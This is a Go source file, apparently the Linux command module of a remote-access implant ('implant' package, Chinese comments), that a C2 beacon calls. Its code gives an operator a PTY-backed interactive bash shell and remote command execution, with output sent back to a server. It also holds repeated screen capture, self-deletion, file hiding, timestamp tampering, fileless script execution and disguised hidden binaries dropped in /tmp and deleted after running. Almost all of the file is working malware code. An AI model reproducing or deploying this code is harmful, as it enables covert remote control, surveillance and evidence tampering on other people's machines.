//go:build linux
// +build linux

package commands

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"implant/core/communication"
	"implant/core/debuglog"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/creack/pty"
)

// ================ 交互式Shell会话管理 ================
var (
	// 保留原有变量以兼容其他功能
	interactiveCmd      *exec.Cmd
	interactiveCmdMutex sync.Mutex
	isInteractiveMode   bool
	interactiveStdin    io.WriteCloser
)

// ================ PTY系统调用定义 ================

// Winsize PTY窗口大小结构（对应C的winsize结构）
type Winsize struct {
	Row    uint16
	Col    uint16
	Xpixel uint16
	Ypixel uint16
}

// 系统调用常量
const (
	TIOCSWINSZ = 0x5414 // 设置终端窗口大小的ioctl命令
)

// ================ 基础系统函数 ================

func HideConsole() error {
	return nil
}

func SetProcessDPIAware() error {
	return nil
}

func FullUnhook() error {
	return nil
}

func Run(b []byte) ([]byte, error) {
	return nil, nil
}

func DeleteSelf() ([]byte, error) {
	filename, err := os.Executable()
	if err != nil {
		return nil, err
	}
	Path := strings.ReplaceAll(string(filename), "\\", "/")
	err = os.RemoveAll(Path)
	if err != nil {
		return nil, errors.New("Remove failed")
	}
	return []byte("Remove " + string(filename) + " success"), nil
}

// DeleteSelfAndExit Linux：unlink 运行中文件安全，删除即完成（退出由调用方 os.Exit 承担）
func DeleteSelfAndExit() ([]byte, error) {
	return DeleteSelf()
}

func KillProcess(pid uint32) ([]byte, error) {
	err := syscall.Kill(int(pid), 15)
	if err != nil {
		return nil, errors.New("process" + strconv.Itoa(int(pid)) + "not found")
	}
	return []byte("kill " + strconv.Itoa(int(pid)) + " success"), nil
}

func Drives() ([]byte, error) {
	return []byte("/"), nil
}

func Shell(path string, args []byte) ([]byte, error) {
	path = "/bin/sh"
	argsArray := []string{"-c", string(args)}
	cmd := exec.Command(path, argsArray...)
	stdout, err := cmd.StdoutPipe()
	cmd.Stderr = cmd.Stdout
	if err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}
	if err = cmd.Start(); err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}

	var buf []byte
	var count int
	time.Sleep(500 * time.Millisecond)
	buf = make([]byte, 1024*50)
	count, err = stdout.Read(buf)
	communication.DataProcess(0, buf[:count])
	for {
		buf = make([]byte, 1024*50)
		count, err = stdout.Read(buf)
		if err != nil {
			break
		}
		communication.DataProcess(0, append([]byte("[+] "+string(path)+" "+string(args)+" :\n"), buf[:count]...))
		time.Sleep(5000 * time.Millisecond)
	}

	if err = cmd.Wait(); err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}

	return []byte("success"), nil
}

func Execute(b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

// Windows双引擎交互式Shell函数的Linux占位实现
func StartCMDInteractiveShell() ([]byte, error) {
	return nil, errors.New("Windows双引擎交互式Shell功能在Linux平台不可用")
}

func SendDualInteractiveInput(input []byte) ([]byte, error) {
	return nil, errors.New("Windows双引擎交互式Shell功能在Linux平台不可用")
}

func StopDualInteractiveShell() ([]byte, error) {
	return nil, errors.New("Windows双引擎交互式Shell功能在Linux平台不可用")
}

func StartWMIInteractiveShell() ([]byte, error) {
	return nil, errors.New("Windows双引擎交互式Shell功能在Linux平台不可用")
}

func InterruptDualInteractiveShell() ([]byte, error) {
	return nil, errors.New("Windows双引擎交互式Shell功能在Linux平台不可用")
}

func HideFile(filePath string) error {
	dir, filename := filepath.Split(filePath)
	if strings.HasPrefix(filename, ".") {
		return nil
	}
	return os.Rename(filePath, filepath.Join(dir, "."+filename))
}

func UnhideFile(filePath string) error {
	dir, filename := filepath.Split(filePath)
	if !strings.HasPrefix(filename, ".") {
		return nil
	}
	if filename[1:] == "" {
		return errors.New("Invalid filename")
	}
	return os.Rename(filePath, filepath.Join(dir, filename[1:]))
}

func ModifyFileTimeAdvanced(filePath string, newTime time.Time) error {
	return os.Chtimes(filePath, newTime, newTime)
}

func StartScreenMonitor(frameRate int) error {
	globalLinuxMonitor.mutex.Lock()
	defer globalLinuxMonitor.mutex.Unlock()

	if globalLinuxMonitor.isRunning {
		return errors.New("屏幕监控已经在运行中")
	}

	if frameRate <= 0 || frameRate > 30 {
		frameRate = 5
	}

	captureMethod := detectBestCaptureMethod()
	if captureMethod == "" {
		return errors.New("系统中未找到可用的屏幕捕获工具")
	}

	globalLinuxMonitor.frameRate = frameRate
	globalLinuxMonitor.captureMethod = captureMethod
	globalLinuxMonitor.isRunning = true

	debuglog.Printf("[✓] Linux屏幕监控已启动，帧率: %dFPS，捕获方法: %s\n", frameRate, captureMethod)
	return nil
}

func StopScreenMonitor() error {
	globalLinuxMonitor.mutex.Lock()
	defer globalLinuxMonitor.mutex.Unlock()

	if !globalLinuxMonitor.isRunning {
		return errors.New("屏幕监控未在运行")
	}

	globalLinuxMonitor.isRunning = false

	select {
	case globalLinuxMonitor.stopChannel <- true:
	default:
	}

	debuglog.Println("[✓] Linux屏幕监控已停止")
	return nil
}

func GetMonitorFrame() ([]byte, error) {
	globalLinuxMonitor.mutex.Lock()
	defer globalLinuxMonitor.mutex.Unlock()

	if !globalLinuxMonitor.isRunning {
		return nil, errors.New("屏幕监控未启动")
	}

	switch globalLinuxMonitor.captureMethod {
	case "imagemagick":
		return captureFrameWithImageMagick()
	case "ffmpeg":
		return captureFrameWithFFmpeg()
	case "xwd":
		return captureFrameWithXWD()
	default:
		return nil, errors.New("未知的捕获方法: " + globalLinuxMonitor.captureMethod)
	}
}

func detectBestCaptureMethod() string {
	methods := []struct {
		name    string
		cmdTest []string
	}{
		{"imagemagick", []string{"import", "-version"}},
		{"ffmpeg", []string{"ffmpeg", "-version"}},
		{"xwd", []string{"xwd", "-help"}},
	}

	for _, method := range methods {
		cmd := exec.Command(method.cmdTest[0], method.cmdTest[1:]...)
		cmd.Stdout = nil
		cmd.Stderr = nil
		if err := cmd.Run(); err == nil {
			return method.name
		}
	}
	return ""
}

func captureFrameWithImageMagick() ([]byte, error) {
	// K9: 15s 超时（X 服务异常/挂起时不再永久阻塞 beacon 命令循环）
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "import",
		"-window", "root",
		"-resize", "75%",
		"-quality", "70",
		"-define", "png:compression-level=3",
		"-depth", "8",
		"png:-",
	)

	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	if err != nil {
		return nil, fmt.Errorf("ImageMagick捕获失败: %v", err)
	}

	if out.Len() == 0 {
		return nil, errors.New("捕获的图像数据为空")
	}

	base64Data := base64.StdEncoding.EncodeToString(out.Bytes())
	return []byte("data:image/png;base64," + base64Data), nil
}

func captureFrameWithFFmpeg() ([]byte, error) {
	display := os.Getenv("DISPLAY")
	if display == "" {
		display = ":0.0"
	}

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "ffmpeg",
		"-f", "x11grab",
		"-video_size", "1280x720",
		"-i", display,
		"-vframes", "1",
		"-c:v", "png",
		"-f", "image2pipe",
		"-loglevel", "quiet",
		"-",
	)

	var out bytes.Buffer
	cmd.Stdout = &out

	err := cmd.Run()
	if err != nil {
		return nil, fmt.Errorf("FFmpeg捕获失败: %v", err)
	}

	if out.Len() == 0 {
		return nil, errors.New("FFmpeg捕获的图像数据为空")
	}

	base64Data := base64.StdEncoding.EncodeToString(out.Bytes())
	return []byte("data:image/png;base64," + base64Data), nil
}

func captureFrameWithXWD() ([]byte, error) {
	// K9: 15s 超时
	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	cmd := exec.CommandContext(ctx, "xwd", "-root", "-silent")
	var xwdOut bytes.Buffer
	cmd.Stdout = &xwdOut

	err := cmd.Run()
	if err != nil {
		return nil, fmt.Errorf("xwd捕获失败: %v", err)
	}

	cmd = exec.Command("convert",
		"xwd:-",
		"-resize", "75%",
		"-quality", "70",
		"png:-",
	)
	cmd.Stdin = &xwdOut
	var pngOut bytes.Buffer
	cmd.Stdout = &pngOut

	err = cmd.Run()
	if err != nil {
		return nil, fmt.Errorf("xwd转换失败: %v", err)
	}

	if pngOut.Len() == 0 {
		return nil, errors.New("转换后的图像数据为空")
	}

	base64Data := base64.StdEncoding.EncodeToString(pngOut.Bytes())
	return []byte("data:image/png;base64," + base64Data), nil
}

func ExecuteAssembly(assemblyBytes []byte, arguments string) ([]byte, error) {
	return nil, errors.New(".NET程序集执行功能在Linux平台暂不支持")
}

func InlineBin(assemblyBytes []byte, arguments string) ([]byte, error) {
	return nil, errors.New("内联二进制执行功能在Linux平台暂不支持")
}

// ================ 基于github.com/creack/pty的真正交互式终端实现 ================

// TerminalSize 终端窗口大小结构（用于JSON通信）
type TerminalSize struct {
	Rows uint16 `json:"rows"`
	Cols uint16 `json:"cols"`
	X    uint16 `json:"x"`
	Y    uint16 `json:"y"`
}

// XTermPTY 基于github.com/creack/pty的PTY终端管理器
type XTermPTY struct {
	cmd         *exec.Cmd      // shell进程
	ptyFile     *os.File       // PTY文件（github.com/creack/pty库返回）
	isActive    bool           // 终端活跃状态
	mutex       sync.RWMutex   // 读写锁
	size        TerminalSize   // 当前终端大小
	buffer      *bytes.Buffer  // 输出缓冲区
	bufferMutex sync.Mutex     // 缓冲区锁
	signalChan  chan os.Signal // 信号处理通道
}

var (
	// 全局PTY终端实例
	globalXTermPTY *XTermPTY
	ptyMutex       sync.Mutex
)

// StartInteractiveShell 启动基于github.com/creack/pty的真正PTY交互式终端
func StartInteractiveShell() ([]byte, error) {
	ptyMutex.Lock()
	defer ptyMutex.Unlock()

	if globalXTermPTY != nil && globalXTermPTY.isActive {
		return []byte("[✓] XTerm PTY terminal already running"), nil
	}

	// 创建shell命令，使用兼容性更好的参数支持不同的命令提示符格式
	cmd := exec.Command("/bin/bash", "-i")
	cmd.Env = []string{
		"TERM=xterm-256color",
		"PATH=" + os.Getenv("PATH"),
		"HOME=" + os.Getenv("HOME"),
		"USER=" + os.Getenv("USER"),
		"SHELL=/bin/bash",
		"LANG=C.UTF-8",
		"LC_ALL=C.UTF-8",
		// 不设置PS1，使用系统默认的提示符，支持Ubuntu/Kali等不同发行版
	}

	// 使用github.com/creack/pty创建PTY
	ptyFile, err := pty.Start(cmd)
	if err != nil {
		return nil, fmt.Errorf("failed to start PTY with github.com/creack/pty: %v", err)
	}

	// 设置初始终端大小
	ws := &pty.Winsize{
		Rows: 24,
		Cols: 80,
		X:    0,
		Y:    0,
	}
	if err := pty.Setsize(ptyFile, ws); err != nil {
		debuglog.Printf("⚠️ [XTerm PTY] Failed to set initial size: %v\n", err)
	}

	// 创建XTermPTY实例
	ptyTerm := &XTermPTY{
		cmd:        cmd,
		ptyFile:    ptyFile,
		isActive:   true,
		buffer:     &bytes.Buffer{},
		size:       TerminalSize{Rows: 24, Cols: 80, X: 0, Y: 0},
		signalChan: make(chan os.Signal, 1),
	}

	globalXTermPTY = ptyTerm

	// 启动各种处理协程
	go ptyTerm.handlePTYOutput()
	go ptyTerm.monitorProcess()
	go ptyTerm.handleSignals()

	debuglog.Println("🖥️ [XTerm PTY] 基于github.com/creack/pty的真正PTY交互式终端已启动，完全兼容xterm.js")
	return []byte("[✓] XTerm PTY interactive terminal started successfully with github.com/creack/pty"), nil
}

// SendInteractiveInput 发送输入到PTY终端（类似WebSocket消息处理）
func SendInteractiveInput(input []byte) ([]byte, error) {
	ptyMutex.Lock()
	defer ptyMutex.Unlock()

	if globalXTermPTY == nil || !globalXTermPTY.isActive {
		return nil, errors.New("no active xterm PTY terminal session")
	}

	globalXTermPTY.mutex.RLock()
	defer globalXTermPTY.mutex.RUnlock()

	// 检查是否是终端大小调整消息
	if len(input) > 0 && input[0] == '\x01' {
		var size TerminalSize
		if err := json.Unmarshal(input[1:], &size); err == nil {
			return globalXTermPTY.resizeTerminal(size)
		}
	}

	// 特殊按键处理（类似xterm.js的键盘事件）
	processedInput := globalXTermPTY.processSpecialKeys(input)

	// 直接写入PTY文件
	n, err := globalXTermPTY.ptyFile.Write(processedInput)
	if err != nil {
		return nil, fmt.Errorf("failed to write to PTY: %v", err)
	}

	return []byte(fmt.Sprintf("[+] %d bytes sent to PTY terminal", n)), nil
}

// StopInteractiveShell 停止PTY交互式终端
func StopInteractiveShell() ([]byte, error) {
	ptyMutex.Lock()
	defer ptyMutex.Unlock()

	if globalXTermPTY == nil || !globalXTermPTY.isActive {
		return []byte("[!] No active xterm PTY terminal session"), nil
	}

	// 优雅关闭PTY终端
	globalXTermPTY.cleanup()
	globalXTermPTY = nil

	debuglog.Println("🔒 [XTerm PTY] PTY交互式终端已停止")
	return []byte("[✓] XTerm PTY interactive terminal stopped successfully"), nil
}

// handlePTYOutput 处理PTY输出（类似xterm.js的数据处理）
func (pty *XTermPTY) handlePTYOutput() {
	buf := make([]byte, 4096) // 增大缓冲区以支持复杂的ANSI序列
	for pty.isActive {
		n, err := pty.ptyFile.Read(buf)
		if err != nil {
			if err != io.EOF && pty.isActive {
				debuglog.Printf("❌ [XTerm PTY] 读取PTY输出失败: %v\n", err)
			}
			break
		}
		if n > 0 {
			// 直接发送数据，不使用缓冲区以确保实时性
			data := make([]byte, n)
			copy(data, buf[:n])

			// 只在数据包较大时才输出日志，避免单字符输出的日志滥出
			if n > 10 {
				debuglog.Printf("📤 [XTerm PTY] 发送数据到服务端: %d字节\n", n)
			}

			// 发送原始PTY数据，使用INTERACTIVE_SHELL_INPUT类型(36)
			communication.DataProcess(36, data)
		}
	}
}

// monitorProcess 监控shell进程状态
func (pty *XTermPTY) monitorProcess() {
	err := pty.cmd.Wait()

	pty.mutex.Lock()
	pty.isActive = false
	pty.mutex.Unlock()

	if err != nil {
		debuglog.Printf("⚠️ [XTerm PTY] Shell进程结束: %v\n", err)
		communication.DataProcess(0, []byte("\r\n[!] XTerm PTY terminal session ended\r\n"))
	} else {
		communication.DataProcess(0, []byte("\r\n[✓] XTerm PTY terminal session completed\r\n"))
	}

	// 自动清理资源
	go func() {
		time.Sleep(1 * time.Second)
		ptyMutex.Lock()
		if globalXTermPTY == pty {
			pty.cleanup()
			globalXTermPTY = nil
		}
		ptyMutex.Unlock()
	}()
}

// handleSignals 处理系统信号
func (pty *XTermPTY) handleSignals() {
	signal.Notify(pty.signalChan, syscall.SIGWINCH, syscall.SIGTERM, syscall.SIGINT)

	for sig := range pty.signalChan {
		if !pty.isActive {
			break
		}

		switch sig {
		case syscall.SIGWINCH:
			// 窗口大小变化信号，重新应用当前大小
			pty.applyCurrentSize()
		case syscall.SIGTERM, syscall.SIGINT:
			// 终止信号，优雅关闭
			debuglog.Println("📡 [XTerm PTY] 接收到终止信号，正在关闭...")
			pty.cleanup()
			return
		}
	}
}

// resizeTerminal 调整终端大小（使用github.com/creack/pty）
func (ptyTerm *XTermPTY) resizeTerminal(newSize TerminalSize) ([]byte, error) {
	ptyTerm.size = newSize

	ws := &pty.Winsize{
		Rows: newSize.Rows,
		Cols: newSize.Cols,
		X:    newSize.X,
		Y:    newSize.Y,
	}

	if err := pty.Setsize(ptyTerm.ptyFile, ws); err != nil {
		return nil, fmt.Errorf("failed to resize PTY: %v", err)
	}

	// 发送SIGWINCH信号给shell进程
	if ptyTerm.cmd.Process != nil {
		ptyTerm.cmd.Process.Signal(syscall.SIGWINCH)
	}

	debuglog.Printf("🔧 [XTerm PTY] 终端大小已调整: %dx%d\n", newSize.Cols, newSize.Rows)
	return []byte(fmt.Sprintf("[✓] Terminal resized to %dx%d", newSize.Cols, newSize.Rows)), nil
}

// applyCurrentSize 应用当前终端大小（使用github.com/creack/pty）
func (ptyTerm *XTermPTY) applyCurrentSize() {
	ws := &pty.Winsize{
		Rows: ptyTerm.size.Rows,
		Cols: ptyTerm.size.Cols,
		X:    ptyTerm.size.X,
		Y:    ptyTerm.size.Y,
	}
	pty.Setsize(ptyTerm.ptyFile, ws)
}

// processSpecialKeys 处理特殊按键（类似xterm.js的键盘映射）
func (pty *XTermPTY) processSpecialKeys(input []byte) []byte {
	// 处理常见的特殊键序列
	if len(input) == 1 {
		switch input[0] {
		case 0x7f: // Backspace
			return []byte{0x08} // Convert to BS
			// 0x0d (CR/回车) 直接透传，由 PTY 的 ICRNL 转为换行；不要转成 CRLF，否则 bash 收到两个换行导致提示符重复
		}
	}

	// 处理Arrow键、Function键等复杂序列
	if len(input) >= 3 && input[0] == 0x1b && input[1] == 0x5b {
		// ESC[ 序列（Arrow键等）
		switch input[2] {
		case 0x41: // Up Arrow
			return []byte{0x1b, 0x5b, 0x41}
		case 0x42: // Down Arrow
			return []byte{0x1b, 0x5b, 0x42}
		case 0x43: // Right Arrow
			return []byte{0x1b, 0x5b, 0x43}
		case 0x44: // Left Arrow
			return []byte{0x1b, 0x5b, 0x44}
		}
	}

	return input
}

// cleanup 清理PTY资源（使用github.com/creack/pty）
func (ptyTerm *XTermPTY) cleanup() {
	ptyTerm.mutex.Lock()
	defer ptyTerm.mutex.Unlock()

	ptyTerm.isActive = false

	// 停止信号处理
	signal.Stop(ptyTerm.signalChan)
	close(ptyTerm.signalChan)

	// 关闭PTY文件
	if ptyTerm.ptyFile != nil {
		ptyTerm.ptyFile.Close()
		ptyTerm.ptyFile = nil
	}

	// 终止shell进程
	if ptyTerm.cmd != nil && ptyTerm.cmd.Process != nil {
		ptyTerm.cmd.Process.Kill()
		// 等待进程结束
		go func() {
			ptyTerm.cmd.Wait()
		}()
	}
}

// ================ 屏幕监控功能 ================

type LinuxScreenMonitor struct {
	isRunning     bool
	stopChannel   chan bool
	frameRate     int
	mutex         sync.Mutex
	captureMethod string
}

var globalLinuxMonitor = &LinuxScreenMonitor{
	isRunning:     false,
	stopChannel:   make(chan bool, 1),
	frameRate:     5,
	captureMethod: "imagemagick",
}

func TakeScreenshot(quality int) ([]byte, error) {
	// 档位 → ImageMagick 质量（0 低=60 / 1 中=75 / 2 高=90）
	q := 75
	switch quality {
	case 0:
		q = 60
	case 2:
		q = 90
	}
	// K9: 15s 超时
	sctx, scancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer scancel()
	cmd := exec.CommandContext(sctx, "import", "-window", "root", "-quality", strconv.Itoa(q), "png:-")
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &out

	err := cmd.Run()
	if err == nil {
		base64Data := base64.StdEncoding.EncodeToString(out.Bytes())
		return []byte("data:image/png;base64," + base64Data), nil
	}

	cmd = exec.Command("xwd", "-root", "-silent")
	var xwdOut bytes.Buffer
	cmd.Stdout = &xwdOut

	err = cmd.Run()
	if err != nil {
		return nil, errors.New("无法截取屏幕：" + err.Error())
	}

	cmd = exec.Command("convert", "xwd:-", "png:-")
	cmd.Stdin = &xwdOut
	var pngOut bytes.Buffer
	cmd.Stdout = &pngOut

	err = cmd.Run()
	if err != nil {
		return nil, errors.New("无法转换截图格式：" + err.Error())
	}

	base64Data := base64.StdEncoding.EncodeToString(pngOut.Bytes())
	return []byte("data:image/png;base64," + base64Data), nil
}

// ExecuteLinuxScript Linux脚本内存执行(fileless sh -s 管道)
func ExecuteLinuxScript(scriptBytes []byte, args string) ([]byte, error) {
	cmd := exec.Command("/bin/sh", "-s")
	cmd.Stdin = bytes.NewReader(scriptBytes)
	var stdout bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stdout
	err := cmd.Run()
	communication.DataProcess(0, stdout.Bytes())
	if err != nil {
		return []byte(fmt.Sprintf("script error: %v", err)), nil
	}
	return []byte("Linux script executed"), nil
}

// ExecuteLinuxBin Linux二进制执行(/tmp 写执行删)
func ExecuteLinuxBin(binBytes []byte, args string) ([]byte, error) {
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf(".%s_%d", masquerade(""), time.Now().UnixNano()))
	if err := os.WriteFile(tmpFile, binBytes, 0755); err != nil {
		return nil, err
	}
	defer os.Remove(tmpFile)
	var cmd *exec.Cmd
	if args != "" {
		cmd = exec.Command(tmpFile, strings.Fields(args)...)
	} else {
		cmd = exec.Command(tmpFile)
	}
	var stdout bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stdout
	err := cmd.Run()
	communication.DataProcess(0, stdout.Bytes())
	if err != nil {
		return []byte(fmt.Sprintf("binary error: %v", err)), nil
	}
	return []byte("Linux binary executed"), nil
}

// ExecuteBof BOF(COFF)执行(仅Windows)
func ExecuteBof(coffBytes []byte, args string) ([]byte, error) {
	return nil, errors.New("BOF(COFF)执行功能在当前平台不可用(仅Windows)")
}

// ExecuteFile 文件执行(写临时文件->执行->捕获输出->删除)
func ExecuteFile(fileBytes []byte, args string) ([]byte, error) {
	tmpFile := filepath.Join(os.TempDir(), fmt.Sprintf(".%s_exec_%d", masquerade(""), time.Now().UnixNano()))
	if err := os.WriteFile(tmpFile, fileBytes, 0755); err != nil {
		return nil, err
	}
	defer os.Remove(tmpFile)
	var cmd *exec.Cmd
	if args != "" {
		cmd = exec.Command(tmpFile, strings.Fields(args)...)
	} else {
		cmd = exec.Command(tmpFile)
	}
	var stdout bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stdout
	err := cmd.Run()
	communication.DataProcess(0, stdout.Bytes())
	if err != nil {
		return []byte(fmt.Sprintf("file exec error: %v", err)), nil
	}
	return []byte("file executed"), nil
}
